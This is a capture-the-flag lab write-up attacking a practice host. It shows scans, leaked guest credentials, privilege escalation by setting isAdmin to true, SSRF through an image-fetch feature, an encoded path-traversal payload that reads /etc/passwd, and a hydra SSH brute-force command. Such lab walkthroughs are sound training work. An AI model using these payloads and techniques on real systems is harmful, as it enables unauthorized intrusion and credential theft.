
## Nmap initial scan 
```shell
┌──(root㉿kali)-[~]
└─# nmap -sV -sC -p- 10.10.3.152
Starting Nmap 7.93 ( https://nmap.org ) at 2025-01-29 17:42 UTC
Nmap scan report for ip-10-10-3-152.eu-west-1.compute.internal (10.10.3.152)
Host is up (0.0061s latency).
Not shown: 65527 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 f9e471f85ad4d51bc6e9d6b69f828ffe (RSA)
|   256 0767134d0e2de60bd0d51ec30d3fe5ff (ECDSA)
|_  256 516a72d565123b4aabc650c9ece94a37 (ED25519)
25/tcp    open  smtp     Postfix smtpd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Not valid before: 2021-11-10T16:53:34
|_Not valid after:  2031-11-08T16:53:34
|_smtp-commands: mail.filepath.lab, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
110/tcp   open  pop3     Dovecot pop3d
|_pop3-capabilities: UIDL TOP PIPELINING SASL STLS CAPA AUTH-RESP-CODE RESP-CODES
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Not valid before: 2021-11-10T16:53:34
|_Not valid after:  2031-11-08T16:53:34
143/tcp   open  imap     Dovecot imapd (Ubuntu)
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Not valid before: 2021-11-10T16:53:34
|_Not valid after:  2031-11-08T16:53:34
|_imap-capabilities: have ENABLE LOGIN-REFERRALS post-login IDLE listed STARTTLS IMAP4rev1 LITERAL+ capabilities Pre-login ID more LOGINDISABLEDA0001 OK SASL-IR
|_ssl-date: TLS randomness does not represent time
993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Not valid before: 2021-11-10T16:53:34
|_Not valid after:  2031-11-08T16:53:34
|_imap-capabilities: have ENABLE LOGIN-REFERRALS post-login IDLE listed capabilities IMAP4rev1 AUTH=PLAIN Pre-login SASL-IR ID more LITERAL+ OK AUTH=LOGINA0001
995/tcp   open  ssl/pop3 Dovecot pop3d
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Not valid before: 2021-11-10T16:53:34
|_Not valid after:  2031-11-08T16:53:34
|_pop3-capabilities: UIDL TOP PIPELINING USER SASL(PLAIN LOGIN) CAPA AUTH-RESP-CODE RESP-CODES
|_ssl-date: TLS randomness does not represent time
4000/tcp  open  http     Node.js (Express middleware)
|_http-title: Sign In
50000/tcp open  http     Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: System Monitoring Portal
|_http-server-header: Apache/2.4.41 (Ubuntu)
MAC Address: 02:33:01:A1:75:F5 (Unknown)
Service Info: Host:  mail.filepath.lab; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.97 seconds

```

we observe that port 50000 is open and host an Apache http server which is a restricted portal
	![](Pasted%20image%2020250129195558.png)

- lets scan the directories to see what we can get from here
``` shell
┌──(root㉿kali)-[~]
└─# gobuster dir  --url http://10.10.3.152:50000/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.3.152:50000/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2025/01/29 17:57:08 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 279]
/.htaccess            (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/index.php            (Status: 200) [Size: 1611]
/javascript           (Status: 301) [Size: 324] [--> http://10.10.3.152:50000/javascript/]
/phpmyadmin           (Status: 403) [Size: 279]
/server-status        (Status: 403) [Size: 279]
/templates            (Status: 301) [Size: 323] [--> http://10.10.3.152:50000/templates/]
/uploads              (Status: 301) [Size: 321] [--> http://10.10.3.152:50000/uploads/]
Progress: 4713 / 4714 (99.98%)===============================================================
2025/01/29 17:57:10 Finished
===============================================================
```

few interesting ones where we have acces however no attack surface was found.
- /templates
	![](Pasted%20image%2020250129200125.png)
- /uploads
	![](Pasted%20image%2020250129200141.png)
- /login.php
	![](Pasted%20image%2020250129201230.png)

 Let s move on port 4000 in order to see if we will find other attack vectors:
  - as it can be observed some credentials are leaked directly on the front page of the app:
	![](Pasted%20image%2020250129201345.png)
- let s scan for more directories for a bigger picture of the app
```shell
root㉿kali)-[~]
└─# gobuster dir  --url http://10.10.3.152:4000/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.3.152:4000/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2025/01/29 18:14:05 Starting gobuster in directory enumeration mode
===============================================================
/Index                (Status: 302) [Size: 29] [--> /signin]
/fonts                (Status: 301) [Size: 177] [--> /fonts/]
/images               (Status: 301) [Size: 179] [--> /images/]
/index                (Status: 302) [Size: 29] [--> /signin]
/signout              (Status: 302) [Size: 29] [--> /signin]
/signin               (Status: 200) [Size: 1295]
/signup               (Status: 500) [Size: 1246]
Progress: 4423 / 4714 (93.83%)===============================================================
2025/01/29 18:14:09 Finished
===============================================================
```


## Application functionality
- using leaked credentials guest/guest we are logged on the main page:
  ![](Pasted%20image%2020250129201706.png)
  - we can observe some fields (first taught was injecting into the albums fields however we have discovered a more approachable way in a bit)
	![](Pasted%20image%2020250129201840.png)
	- we can tamper with `isAdmin` attribute to see if something happens:
	![](Pasted%20image%2020250129202237.png)
indeed.. setting `isAdmin` attribute on true, we have unlocked two more web page sections (API/Settings)
	![](Pasted%20image%2020250129202305.png)
	**API section:**
		 we see some credentials for the previous app login's page(port:50000) however we need to look around for passwords
	![](Pasted%20image%2020250129202632.png)
	**Settings section:**
	![](Pasted%20image%2020250129221306.png)

Since those are internal API's we need to find out a way to make a request to them using an internal network. After checking the settings tab we find out that we can fetch trough an image upload functionality (is fetching the image from the specified URL and then will upload it) which means that we can use the internal network of the app in order to make requests.

![](Pasted%20image%2020250129221819.png)
	![](Pasted%20image%2020250129222023.png)
```shell
──(root㉿kali)-[~]
└─# echo "eyJSZXZpZXdBcHBVc2VybmFtZSI6ImFkbWluIiwiUmV2aWV3QXBwUGFzc3dvcmQiOiJhZG1pbkAhISEiLCJTeXNNb25BcHBVc2VybmFtZSI6ImFkbWluaXN0cmF0b3IiLCJTeXNNb25BcHBQYXNzd29yZCI6IlMkOSRxazZkIyoqTFFVIn0=" | base64 --decode
{"ReviewAppUsername":"admin","ReviewAppPassword":"admin@!!!","SysMonAppUsername":"administrator","SysMonAppPassword":"S$9$qk6d#**LQU"}       
```

- we are in the administrator front page of SysMonApp
	![](Pasted%20image%2020250129222303.png)

- inspecting the source page we see a possible LFI vulnerability:
	![](Pasted%20image%2020250129222533.png)

## SSH
Let s try various payloads to acces sensitive information trough a LFI poisoning and we applied an encoded path traversal payload as follows:
```shell
....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd
```

![](Pasted%20image%2020250129224431.png)

- now we will try to fuzz SSH one of these accounts using hydra as brute forcer:
```shell
hydra -l joshua -P /usr/share/wordlists/fasttrack.txt <IP> ssh
```

## Summary
Nmap scan revealed an ssh service and two webservers running at port 4000 and 50000. In port 4000, changing the isAdmin field to ‘true’ in the guest account led to administrator privileges subsequently opening an API and settings section. Fetching the API from the settings section gave us base64 encoded admin password for the SysMon login portal at port 50000. Logging in to SysMon portal revealed a dashboard containing the first flag. Checking the source code we found that the profile picture of the admin was a png file that was requested by a query parameter ‘img’. LFI injection revealed the /etc/passwd file which in turn revealed 2 usernames Joshua and Charles. A valid password for joshua was found for SSH login. The second flag was found in the /var/www/html directory.


